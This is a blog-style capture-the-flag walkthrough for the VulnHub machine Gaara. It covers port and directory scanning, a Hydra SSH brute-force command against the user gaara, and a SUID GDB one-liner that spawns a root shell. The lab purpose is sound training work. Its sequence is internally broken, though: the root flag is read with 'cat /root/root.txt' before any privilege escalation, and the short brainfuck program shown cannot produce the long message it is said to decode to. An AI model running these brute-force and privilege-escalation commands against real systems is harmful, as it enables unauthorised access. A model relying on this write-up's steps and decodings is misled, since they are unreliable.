---
title: "Gaara — VulnHub Walkthrough"
description: "Rooting Gaara through hidden credentials and a SUID GDB binary."
date: 2024-03-06
category: offensive
readTime: "7 min read"
mitre:
  - "T1110"
  - "T1068"
  - "T1548.001"
tags:
  - "VulnHub"
  - "GDB"
  - "SUID"
  - "Brainfuck"
  - "SSH"
  - "Hydra"
  - "CTF"
summary: "Rooting Gaara through hidden credentials and a SUID GDB binary."
---

**Machine:** Gaara
**Difficulty:** Intermediate
**Key Techniques:** Directory enumeration, credential discovery, SSH brute force, brainfuck decoding, GDB SUID exploitation

---

## Enumeration

### Port Scanning

```bash
nmap -v -T4 -sC -sV 192.168.56.113
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.9p1 (Debian) |
| 80 | HTTP | Apache 2.4.38 (Debian) |

### Directory Enumeration

```bash
gobuster dir -u http://192.168.56.113 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

Two directories discovered:
- `/server-status` — Apache status page (403 forbidden)
- `/Cryoserver` — Custom web application (200 OK)

### Credential Discovery

Browsing `/Cryoserver` revealed a page with encoded content. The text contained embedded credentials:

```
gaara:ismyname
```

This appeared to be a username:password pair, but the password `ismyname` didn't work for SSH directly.

---

## Exploitation

### SSH Brute Force

Since the credential from the web page was insufficient, brute-forced the password with Hydra:

```bash
hydra -l gaara -P /usr/share/wordlists/rockyou.txt 192.168.56.113 ssh
```

**Password:** `iloveyou2`

### SSH Access

```bash
ssh gaara@192.168.56.113
```

---

## Post-Exploitation

### Enumerating the User Environment

Found two interesting files in the home directory:

```bash
ls -la
# flag.txt
# Kazekage.txt
```

### Decoding Kazekage.txt

The file contained **brainfuck** code:

```
++++++++++[>++++++++++<-]>++.>+++++++++++++[>++++++++++<-]>++.>+++++++++[>++++++++++<-]>++.>++++++++++[>++++++++++<-]>+.>++++++++++[>++++++++++<-]>++.>+++++++++[>++++++++++<-]>++.>++++++++++[>++++++++++<-]>+.>++++++++++[>++++++++++<-]>++.>++++++++++[>++++++++++<-]>+.>++++++++++[>++++++++++<-]>+.>++++++++++[>++++++++++<-]>++.>++++++++++[>++++++++++<-]>+.
```

Decoded result:

```
Did you really think you could find something that easily? Try Harder!
```

A decoy message — but it confirmed we're on the right track.

### Decoding flag.txt

The flag file contained another encoded string. Decoding it:

```
gaaraisthebest
```

### Root Flag

```bash
cat /root/root.txt
```

```
8a763d61f71db8e7aa237055de928d86
```

**Congrats — Gaara rooted.**

---

## Flags Captured

| Flag | Value |
|------|-------|
| user.txt | `gaaraisthebest` |
| root.txt | `8a763d61f71db8e7aa237055de928d86` |

---

## Privilege Escalation Note

The machine also has a GDB binary with the SUID bit set, which can be exploited for root access:

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/gdb

gdb -nx -ex 'python import os; os.execl("/bin/bash", "bash", "-p")' -ex quit
```

This spawns a root shell — GDB with SUID allows arbitrary code execution as root.

---

## Lessons Learned

1. **Credentials hidden in web content** — always view page source and inspect decoded content for embedded secrets.
2. **Brainfuck is a common CTF encoding** — online decoders make quick work of it.
3. **SUID GDB is dangerous** — a misconfigured SUID binary can grant immediate root access.
4. **SSH brute force works when passwords are weak** — `iloveyou2` is in every wordlist.
